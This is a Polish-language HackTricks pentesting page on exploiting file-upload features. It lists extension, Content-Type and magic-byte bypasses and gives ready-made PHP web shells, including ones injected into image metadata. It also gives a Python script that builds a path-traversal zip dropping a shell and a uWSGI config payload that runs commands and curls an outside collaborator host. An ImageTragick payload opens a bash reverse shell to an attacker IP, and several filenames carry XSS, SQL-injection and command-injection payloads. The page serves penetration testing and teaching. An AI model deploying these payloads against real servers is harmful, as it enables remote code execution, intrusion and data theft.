# Przesyłanie plików

{{#include ../../banners/hacktricks-training.md}}

## Ogólna metodologia przesyłania plików

Other useful extensions:

- **PHP**: _.php_, _.php2_, _.php3_, ._php4_, ._php5_, ._php6_, ._php7_, .phps, ._pht_, ._phtm, .phtml_, ._pgif_, _.shtml, .htaccess, .phar, .inc, .hphp, .ctp, .module_
- **Working in PHPv8**: _.php_, _.php4_, _.php5_, .phtml_, .module_, .inc_, .hphp_, .ctp_
- **ASP**: _.asp, .aspx, .config, .ashx, .asmx, .aspq, .axd, .cshtm, .cshtml, .rem, .soap, .vbhtm, .vbhtml, .asa, .cer, .shtml_
- **Jsp:** _.jsp, .jspx, .jsw, .jsv, .jspf, .wss, .do, .action_
- **Coldfusion:** _.cfm, .cfml, .cfc, .dbm_
- **Flash**: _.swf_
- **Perl**: _.pl, .cgi_
- **Erlang Yaws Web Server**: _.yaws_

### Omijanie kontroli rozszerzeń plików

1. Jeśli mają zastosowanie, **sprawdź** poprzednie rozszerzenia. Testuj je także używając wielkich liter: _pHp, .pHP5, .PhAr ..._
2. _Sprawdź **dodanie prawidłowego rozszerzenia przed** rozszerzeniem wykonawczym (użyj również poprzednich rozszerzeń):_
- _file.png.php_
- _file.png.Php5_
3. Spróbuj dodać **znaki specjalne na końcu.** Możesz użyć Burp do **bruteforce'owania** wszystkich znaków **ascii** i **Unicode**. (_Uwaga: możesz także spróbować użyć wcześniej wspomnianych rozszerzeń_)
- _file.php%20_
- _file.php%0a_
- _file.php%00_
- _file.php%0d%0a_
- _file.php/_
- _file.php.\\_
- _file._
- _file.php...._
- _file.pHp5...._
4. Spróbuj ominąć zabezpieczenia **oszukując parser rozszerzeń** po stronie serwera technikami takimi jak **podwajanie** **rozszerzenia** lub **dodawanie śmieciowych** danych (bajtów **null**) pomiędzy rozszerzeniami. _Możesz również użyć **poprzednich rozszerzeń** żeby przygotować lepszy payload._
- _file.png.php_
- _file.png.pHp5_
- _file.php#.png_
- _file.php%00.png_
- _file.php\x00.png_
- _file.php%0a.png_
- _file.php%0d%0a.png_
- _file.phpJunk123png_
5. Dodaj **kolejną warstwę rozszerzeń** do poprzedniego sprawdzenia:
- _file.png.jpg.php_
- _file.php%00.png%00.jpg_
6. Spróbuj umieścić **rozszerzenie wykonywalne przed prawidłowym rozszerzeniem** i miej nadzieję, że serwer jest źle skonfigurowany. (przydatne przy błędnych konfiguracjach Apache, gdzie wszystko z rozszerzeniem .php — nawet jeśli nie kończy się na .php — wykona kod):
- _ex: file.php.png_
7. Używanie **NTFS alternate data stream (ADS)** w **Windows**. W tym przypadku po zabronionym rozszerzeniu i przed dozwolonym zostanie wstawiony dwukropek ":”. W rezultacie na serwerze zostanie utworzony **pusty plik z zabronionym rozszerzeniem** (np. "file.asax:.jpg”). Ten plik może być później edytowany innymi technikami, np. używając jego krótkiej nazwy. Wzorzec "**::$data**” może być również użyty do tworzenia plików niepustych. Dlatego dodanie kropki po tym wzorcu może być przydatne do ominięcia dalszych ograniczeń (np. "file.asp::$data.”)
8. Spróbuj przekroczyć limity długości nazwy pliku. Prawidłowe rozszerzenie zostaje odcięte, a złośliwy PHP pozostaje. AAA<--SNIP-->AAA.php

```
# Linux maximum 255 bytes
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 255
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4 # minus 4 here and adding .png
# Upload the file and check response how many characters it alllows. Let's say 236
python -c 'print "A" * 232'
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
# Make the payload
AAA<--SNIP 232 A-->AAA.php.png
```

### Omijanie Content-Type, magic number, kompresji i zmiany rozmiaru

- Omijaj kontrole nagłówka **Content-Type** ustawiając wartość nagłówka **Content-Type** na: _image/png_ , _text/plain , application/octet-stream_
1. Content-Type **wordlist**: [https://github.com/danielmiessler/SecLists/blob/master/Miscellaneous/Web/content-type.txt](https://github.com/danielmiessler/SecLists/blob/master/Miscellaneous/Web/content-type.txt)
- Omijaj kontrolę **magic number** dodając na początku pliku **bajty prawdziwego obrazu** (zmylić polecenie _file_). Lub wprowadź shell wewnątrz **metadanych**:\
`exiftool -Comment="<?php echo 'Command:'; if($_POST){system($_POST['cmd']);} __halt_compiler();" img.jpg`\
`\` lub możesz też **wprowadzić payload bezpośrednio** do obrazu:\
`echo '<?php system($_REQUEST['cmd']); ?>' >> img.png`
- Jeśli do Twojego obrazu jest dodawana **kompresja**, na przykład przy użyciu bibliotek PHP takich jak [PHP-GD](https://www.php.net/manual/fr/book.image.php), powyższe techniki mogą być nieskuteczne. Możesz jednak użyć **PLTE chunk** [**techniki opisanej tutaj**](https://www.synacktiv.com/publications/persistent-php-payloads-in-pngs-how-to-inject-php-code-in-an-image-and-keep-it-there.html) aby wstawić tekst, który **przetrwa kompresję**.
- [**Github with the code**](https://github.com/synacktiv/astrolock/blob/main/payloads/generators/gen_plte_png.php)
- Strona może również **zmieniać rozmiar** obrazu, używając na przykład funkcji PHP-GD `imagecopyresized` lub `imagecopyresampled`. Możesz jednak użyć **IDAT chunk** [**techniki opisanej tutaj**](https://www.synacktiv.com/publications/persistent-php-payloads-in-pngs-how-to-inject-php-code-in-an-image-and-keep-it-there.html) aby wstawić tekst, który **przetrwa kompresję**.
- [**Github with the code**](https://github.com/synacktiv/astrolock/blob/main/payloads/generators/gen_idat_png.php)
- Inna technika na stworzenie payloadu, który **przetrwa zmianę rozmiaru obrazu**, wykorzystuje funkcję PHP-GD `thumbnailImage`. Możesz także użyć **tEXt chunk** [**techniki opisanej tutaj**](https://www.synacktiv.com/publications/persistent-php-payloads-in-pngs-how-to-inject-php-code-in-an-image-and-keep-it-there.html) aby wstawić tekst, który **przetrwa kompresję**.
- [**Github with the code**](https://github.com/synacktiv/astrolock/blob/main/payloads/generators/gen_tEXt_png.php)

### Inne sztuczki do sprawdzenia

- Znajdź podatność pozwalającą **zmienić nazwę** już przesłanego pliku (aby zmienić rozszerzenie).
- Znajdź podatność **Local File Inclusion** aby uruchomić backdoor.
- **Możliwe ujawnienie informacji**:
1. Prześlij **kilka razy** (i w **tym samym czasie**) **ten sam plik** o **tej samej nazwie**
2. Prześlij plik o **nazwie** pliku lub folderu, który **już istnieje**
3. Przesłanie pliku o nazwie **"." , "..” lub "…”**. Na przykład w Apache na **Windows**, jeśli aplikacja zapisuje przesłane pliki w katalogu "/www/uploads/”, nazwa pliku "." utworzy plik o nazwie "uploads” w katalogu "/www/".
4. Prześlij plik, którego nie da się łatwo usunąć, taki jak **"…:.jpg”** w **NTFS**. (Windows)
5. Prześlij plik w **Windows** z **nieprawidłowymi znakami** takimi jak `|<>*?”` w nazwie. (Windows)
6. Prześlij plik w **Windows** używając zastrzeżonych (**zabronionych**) nazw takich jak CON, PRN, AUX, NUL, COM1, COM2, COM3, COM4, COM5, COM6, COM7, COM8, COM9, LPT1, LPT2, LPT3, LPT4, LPT5, LPT6, LPT7, LPT8, i LPT9.
- Spróbuj także **przesłać plik wykonywalny** (.exe) lub **.html** (mniej podejrzane), który **wykona kod** po przypadkowym otwarciu przez ofiarę.

### Specjalne triki z rozszerzeniami

Jeśli próbujesz przesyłać pliki na serwer **PHP**, {take a look at the **.htaccess** trick to execute code}(https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-web/php-tricks-esp/index.html#code-execution).\
Jeśli próbujesz przesyłać pliki na serwer **ASP**, {take a look at the **.config** trick to execute code}(../../network-services-pentesting/pentesting-web/iis-internet-information-services.md#execute-config-files).

Pliki `.phar` są jak `.jar` dla Java, ale dla php, i mogą być **używane jak plik php** (wykonywane przez php, lub includowane w skrypcie...)

Rozszerzenie `.inc` jest czasami używane dla plików php, które służą jedynie do **importu plików**, więc w pewnym momencie ktoś mógł pozwolić na **wykonywanie tego rozszerzenia**.

## **Jetty RCE**

If you can upload a XML file into a Jetty server you can obtain [RCE because **new \*.xml and \*.war are automatically processed**](https://twitter.com/ptswarm/status/1555184661751648256/photo/1)**.** Więc, jak pokazano na poniższym obrazku, prześlij plik XML do `$JETTY_BASE/webapps/` i oczekuj shell'a!

![https://twitter.com/ptswarm/status/1555184661751648256/photo/1](<../../images/image (1047).png>)

## **uWSGI RCE**

For a detailed exploration of this vulnerability check the original research: [uWSGI RCE Exploitation](https://blog.doyensec.com/2023/02/28/new-vector-for-dirty-arbitrary-file-write-2-rce.html).

Remote Command Execution (RCE) vulnerabilities can be exploited in uWSGI servers if one has the capability to modify the `.ini` configuration file. uWSGI configuration files leverage a specific syntax to incorporate "magic" variables, placeholders, and operators. Notably, the '@' operator, utilized as `@(filename)`, is designed to include the contents of a file. Among the various supported schemes in uWSGI, the "exec" scheme is particularly potent, allowing the reading of data from a process's standard output. This feature can be manipulated for nefarious purposes such as Remote Command Execution or Arbitrary File Write/Read when a `.ini` configuration file is processed.

Consider the following example of a harmful `uwsgi.ini` file, showcasing various schemes:
```ini
[uwsgi]
; read from a symbol
foo = @(sym://uwsgi_funny_function)
; read from binary appended data
bar = @(data://[REDACTED])
; read from http
test = @(http://[REDACTED])
; read from a file descriptor
content = @(fd://[REDACTED])
; read from a process stdout
body = @(exec://whoami)
; curl to exfil via collaborator
extra = @(exec://curl http://collaborator-unique-host.oastify.com)
; call a function returning a char *
characters = @(call://uwsgi_func)
```
Wykonanie payload następuje podczas parsowania pliku konfiguracyjnego. Aby konfiguracja została aktywowana i sparsowana, proces uWSGI musi zostać zrestartowany (potencjalnie po awarii lub w wyniku Denial of Service attack) lub plik musi mieć włączone auto-reload. Funkcja auto-reload, jeśli jest włączona, przeładowuje plik w określonych odstępach po wykryciu zmian.

Konieczne jest zrozumienie luźnego sposobu parsowania pliku konfiguracyjnego przez uWSGI. Konkretnie, omawiany payload może być wstawiony do pliku binarnego (takiego jak obraz lub PDF), co dodatkowo rozszerza zakres możliwej eksploatacji.

## **wget File Upload/SSRF Trick**

W niektórych przypadkach możesz stwierdzić, że serwer używa **`wget`** do **pobierania plików** i możesz **wskazać** **URL**. W takich sytuacjach kod może sprawdzać, czy rozszerzenie pobieranych plików znajduje się na whitelist, aby zapewnić, że pobrane zostaną tylko dozwolone pliki. Jednak **ten check można obejść.**\
Maksymalna długość nazwy pliku w **linux** to **255**, jednak **wget** obcina nazwy plików do **236** znaków. Możesz pobrać plik o nazwie "A"\*232+".php"+".gif" — ta nazwa ominie check (ponieważ w tym przykładzie **".gif"** jest dozwolonym rozszerzeniem), ale `wget` zmieni nazwę pliku na "A"\*232+".php".
```bash
#Create file and HTTP server
echo "SOMETHING" > $(python -c 'print("A"*(236-4)+".php"+".gif")')
python3 -m http.server 9080
```

```bash
#Download the file
wget 127.0.0.1:9080/$(python -c 'print("A"*(236-4)+".php"+".gif")')
The name is too long, 240 chars total.
Trying to shorten...
New name is AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php.
--2020-06-13 03:14:06--  http://127.0.0.1:9080/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php.gif
Connecting to 127.0.0.1:9080... connected.
HTTP request sent, awaiting response... 200 OK
Length: 10 [image/gif]
Saving to: ‘AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php’

AAAAAAAAAAAAAAAAAAAAAAAAAAAAA 100%[===============================================>]      10  --.-KB/s    in 0s

2020-06-13 03:14:06 (1.96 MB/s) - ‘AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php’ saved [10/10]
```
Zauważ, że **inną opcją**, o której możesz myśleć, aby obejść tę kontrolę, jest sprawienie, żeby **serwer HTTP przekierował do innego pliku**, więc początkowy URL ominie kontrolę, a następnie wget pobierze przekierowany plik pod nową nazwą. To **nie zadziała** **chyba że** wget jest używany z **parametrem** `--trust-server-names`, ponieważ **wget pobierze przekierowaną stronę pod nazwą pliku wskazaną w oryginalnym URL**.

## Narzędzia

- [Upload Bypass](https://github.com/sAjibuu/Upload_Bypass) to potężne narzędzie zaprojektowane, by wspomóc Pentesters i Bug Hunters w testowaniu mechanizmów uploadu plików. Wykorzystuje różne techniki bug bounty, upraszczając proces identyfikacji i wykorzystywania podatności, zapewniając gruntowną ocenę aplikacji webowych.

### Corrupting upload indices with snprintf quirks (historical)

Niektóre legacy upload handlery używające `snprintf()` lub podobnych do budowania tablic multi-file z pojedynczego uploadu mogą zostać oszukane tak, by sfałszować strukturę `_FILES`. Z powodu niespójności i obcinania w zachowaniu `snprintf()`, starannie przygotowany pojedynczy upload może wyglądać po stronie serwera jak wiele plików z indeksami, co wprowadza w błąd logikę zakładającą sztywną strukturę (np. traktując to jako multi-file upload i wybierając niebezpieczne ścieżki). Choć dziś niszowe, ten wzorzec „index corruption” czasem powraca w CTFs i starszych kodach.

## Od uploadu pliku do innych podatności

- Ustaw **filename** na `../../../tmp/lol.png` i spróbuj osiągnąć **path traversal**
- Ustaw **filename** na `sleep(10)-- -.jpg` i możesz osiągnąć **SQL injection**
- Ustaw **filename** na `<svg onload=alert(document.domain)>`, aby osiągnąć **XSS**
- Ustaw **filename** na `; sleep 10;`, aby przetestować pewne command injection (more [command injections tricks here](../command-injection.md))
- [**XSS** in image (svg) file upload](../xss-cross-site-scripting/index.html#xss-uploading-files-svg)
- **JS** file **upload** + **XSS** = [**Service Workers** exploitation](../xss-cross-site-scripting/index.html#xss-abusing-service-workers)
- [**XXE in svg upload**](../xxe-xee-xml-external-entity.md#svg-file-upload)
- [**Open Redirect** via uploading svg file](../open-redirect.md#open-redirect-uploading-svg-files)
- Wypróbuj **różne svg payloady** z [**https://github.com/allanlw/svg-cheatsheet**](https://github.com/allanlw/svg-cheatsheet)
- [Famous **ImageTrick** vulnerability](https://mukarramkhalid.com/imagemagick-imagetragick-exploit/)
- Jeśli możesz **zlecić serwerowi pobranie obrazu z URL**, możesz spróbować nadużyć [SSRF](../ssrf-server-side-request-forgery/index.html). Jeśli ten **obraz** zostanie **zapisany** w jakimś **publicznym** miejscu, możesz też podać URL z [https://iplogger.org/invisible/](https://iplogger.org/invisible/) i **ukraść informacje o każdym odwiedzającym**.
- [**XXE and CORS** bypass with PDF-Adobe upload](pdf-upload-xxe-and-cors-bypass.md)
- Specjalnie spreparowane PDFy do XSS: Strona [following page present how to **inject PDF data to obtain JS execution**](../xss-cross-site-scripting/pdf-injection.md). Jeśli możesz uploadować PDFy, możesz przygotować taki PDF, który wykona dowolny JS zgodnie z podanymi wskazówkami.
- Wyślij zawartość \[eicar]\([**https://secure.eicar.org/eicar.com.txt**](https://secure.eicar.org/eicar.com.txt)) aby sprawdzić, czy serwer ma jakiś **antivirus**
- Sprawdź, czy istnieje jakiś **limit rozmiaru** przy uploadzie plików

Oto lista top 10 rzeczy, które możesz osiągnąć przez upload (źródło: [here](https://twitter.com/SalahHasoneh1/status/1281274120395685889)):

1. **ASP / ASPX / PHP5 / PHP / PHP3**: Webshell / RCE
2. **SVG**: Stored XSS / SSRF / XXE
3. **GIF**: Stored XSS / SSRF
4. **CSV**: CSV injection
5. **XML**: XXE
6. **AVI**: LFI / SSRF
7. **HTML / JS** : HTML injection / XSS / Open redirect
8. **PNG / JPEG**: Pixel flood attack (DoS)
9. **ZIP**: RCE via LFI / DoS
10. **PDF / PPTX**: SSRF / BLIND XXE

#### Rozszerzenie Burp


{{#ref}}
https://github.com/portswigger/upload-scanner
{{#endref}}

## Magiczne bajty nagłówka

- **PNG**: `"\x89PNG\r\n\x1a\n\0\0\0\rIHDR\0\0\x03H\0\xs0\x03["`
- **JPG**: `"\xff\xd8\xff"`

Zobacz [https://en.wikipedia.org/wiki/List_of_file_signatures](https://en.wikipedia.org/wiki/List_of_file_signatures) dla innych typów plików.

## Automatyczne rozpakowywanie ZIP/TAR po uploadzie

Jeśli możesz przesłać ZIP, który będzie rozpakowany na serwerze, możesz zrobić dwie rzeczy:

### Symlink

Wyślij archiwum zawierające dowiązania symboliczne do innych plików, a następnie, uzyskując dostęp do rozpakowanych plików, otrzymasz dostęp do wskazanych plików:
```
ln -s ../../../index.php symindex.txt
zip --symlinks test.zip symindex.txt
tar -cvf test.tar symindex.txt
```
### Rozpakowywanie do różnych folderów

Nieoczekiwane tworzenie plików w katalogach podczas dekompresji stanowi poważny problem. Pomimo początkowych założeń, że taka konfiguracja może chronić przed OS-level command execution poprzez złośliwe file uploads, obsługa hierarchicznej kompresji i możliwości directory traversal formatu ZIP mogą zostać wykorzystane. Pozwala to atakującym obejść ograniczenia i wydostać się z bezpiecznych upload directories przez manipulację funkcją dekompresji aplikacji docelowej.

Zautomatyzowany exploit umożliwiający utworzenie takich plików jest dostępny pod [**evilarc on GitHub**](https://github.com/ptoomey3/evilarc). Narzędzie można użyć jak pokazano:
```python
# Listing available options
python2 evilarc.py -h
# Creating a malicious archive
python2 evilarc.py -o unix -d 5 -p /var/www/html/ rev.php
```
Dodatkowo, **symlink trick with evilarc** jest opcją. Jeśli celem jest zaatakowanie pliku takiego jak `/flag.txt`, należy utworzyć symlink do tego pliku w swoim systemie. To zapewnia, że evilarc nie napotka błędów podczas działania.

Poniżej znajduje się przykład kodu Python użytego do stworzenia złośliwego pliku zip:
```python
#!/usr/bin/python
import zipfile
from io import BytesIO

def create_zip():
f = BytesIO()
z = zipfile.ZipFile(f, 'w', zipfile.ZIP_DEFLATED)
z.writestr('../../../../../var/www/html/webserver/shell.php', '<?php echo system($_REQUEST["cmd"]); ?>')
z.writestr('otherfile.xml', 'Content of the file')
z.close()
zip = open('poc.zip','wb')
zip.write(f.getvalue())
zip.close()

create_zip()
```
**Wykorzystywanie kompresji do file spraying**

Po więcej szczegółów **sprawdź oryginalny wpis na**: [https://blog.silentsignal.eu/2014/01/31/file-upload-unzip/](https://blog.silentsignal.eu/2014/01/31/file-upload-unzip/)

1.  **Creating a PHP Shell**: Kod PHP zapisany jest tak, aby wykonywał polecenia przekazywane przez zmienną `$_REQUEST`.

```php
<?php
if(isset($_REQUEST['cmd'])){
$cmd = ($_REQUEST['cmd']);
system($cmd);
}?>
```

2.  **File Spraying and Compressed File Creation**: Utworzono wiele plików, a następnie złożono archiwum zip zawierające te pliki.

```bash
root@s2crew:/tmp# for i in `seq 1 10`;do FILE=$FILE"xxA"; cp simple-backdoor.php $FILE"cmd.php";done
root@s2crew:/tmp# zip cmd.zip xx*.php
```

3.  **Modification with a Hex Editor or vi**: Nazwy plików wewnątrz zip są zmieniane za pomocą vi lub edytora hex, zastępując "xxA" przez "../", aby przejść do katalogów wyżej.

```bash
:set modifiable
:%s/xxA/..\//g
:x!
```

## ImageTragic

Prześlij tę zawartość z rozszerzeniem obrazu, aby wykorzystać podatność **(ImageMagick , 7.0.1-1)** (z [exploit](https://www.exploit-db.com/exploits/39767))
```
push graphic-context
viewbox 0 0 640 480
fill 'url(https://127.0.0.1/test.jpg"|bash -i >& /dev/tcp/attacker-ip/attacker-port 0>&1|touch "hello)'
pop graphic-context
```
## Osadzanie PHP shell w PNG

Osadzenie PHP shell w chunku IDAT pliku PNG może skutecznie obejść niektóre operacje przetwarzania obrazów. Funkcje `imagecopyresized` i `imagecopyresampled` z PHP-GD są szczególnie istotne w tym kontekście, ponieważ są powszechnie używane odpowiednio do zmiany rozmiaru i resamplingu obrazów. Możliwość, że osadzony PHP shell pozostaje niezmieniony przez te operacje, stanowi istotną przewagę w niektórych przypadkach użycia.

Szczegółowe omówienie tej techniki, w tym metodologia i potencjalne zastosowania, znajduje się w następującym artykule: ["Encoding Web Shells in PNG IDAT chunks"](https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/). Ten materiał oferuje kompleksowe zrozumienie procesu i jego implikacji.

More information in: [https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/](https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/)

## Pliki polyglot

Pliki polyglot działają jak kameleony — mogą jednocześnie poprawnie istnieć w wielu formatach plików. Interesującym przykładem jest [GIFAR](https://en.wikipedia.org/wiki/Gifar), hybryda, która działa zarówno jako GIF, jak i RAR. Takie pliki nie ograniczają się do tej pary; możliwe są też kombinacje typu GIF i JS lub PPT i JS.

Główna użyteczność polyglotów polega na ich zdolności do obchodzenia zabezpieczeń, które filtrują pliki na podstawie typu. W praktyce wiele aplikacji dopuszcza do uploadu tylko określone typy plików — np. JPEG, GIF czy DOC — aby zmniejszyć ryzyko związane z potencjalnie niebezpiecznymi formatami (np. JS, PHP, czy Phar). Jednak polyglot, spełniając strukturalne kryteria wielu formatów jednocześnie, może cicho ominąć te ograniczenia.

Mimo swojej wszechstronności polygloty napotykają ograniczenia. Na przykład, chociaż polyglot może jednocześnie być PHAR i JPEG, powodzenie uploadu może zależeć od polityki rozszerzeń na platformie. Jeśli system jest rygorystyczny co do dozwolonych rozszerzeń, sama strukturalna dwoistość polyglota może nie wystarczyć do umożliwienia uploadu.

More information in: [https://medium.com/swlh/polyglot-files-a-hackers-best-friend-850bf812dd8a](https://medium.com/swlh/polyglot-files-a-hackers-best-friend-850bf812dd8a)

### Wgrywanie prawidłowych plików JSON, tak jakby to był PDF

Jak uniknąć wykrywania typu pliku, wgrywając prawidłowy plik JSON nawet jeśli nie jest dozwolony, podszywając go pod PDF (techniki z **[this blog post](https://blog.doyensec.com/2025/01/09/cspt-file-upload.html)**):

- **`mmmagic` library**: Dopóki magic bytes `%PDF` znajdują się w pierwszych 1024 bajtach, plik jest uznawany za ważny (zobacz przykład w poście)
- **`pdflib` library**: Dodaj fałszywy format PDF wewnątrz pola JSON, aby biblioteka uznała to za pdf (zobacz przykład w poście)
- **`file` binary**: Może czytać do 1048576 bajtów z pliku. Po prostu stwórz JSON większy niż to, aby nie móc sparsować zawartości jako JSON, a następnie wewnątrz JSON umieść początkową część prawdziwego PDF — wtedy narzędzie uzna plik za PDF

## Źródła

- [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20insecure%20files](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20insecure%20files)
- [https://github.com/modzero/mod0BurpUploadScanner](https://github.com/modzero/mod0BurpUploadScanner)
- [https://github.com/almandin/fuxploider](https://github.com/almandin/fuxploider)
- [https://blog.doyensec.com/2023/02/28/new-vector-for-dirty-arbitrary-file-write-2-rce.html](https://blog.doyensec.com/2023/02/28/new-vector-for-dirty-arbitrary-file-write-2-rce.html)
- [https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/](https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/)
- [https://medium.com/swlh/polyglot-files-a-hackers-best-friend-850bf812dd8a](https://medium.com/swlh/polyglot-files-a-hackers-best-friend-850bf812dd8a)
- [https://blog.doyensec.com/2025/01/09/cspt-file-upload.html](https://blog.doyensec.com/2025/01/09/cspt-file-upload.html)
- [The Art of PHP: CTF‑born exploits and techniques](https://blog.orange.tw/posts/2025-08-the-art-of-php-ch/)

{{#include ../../banners/hacktricks-training.md}}
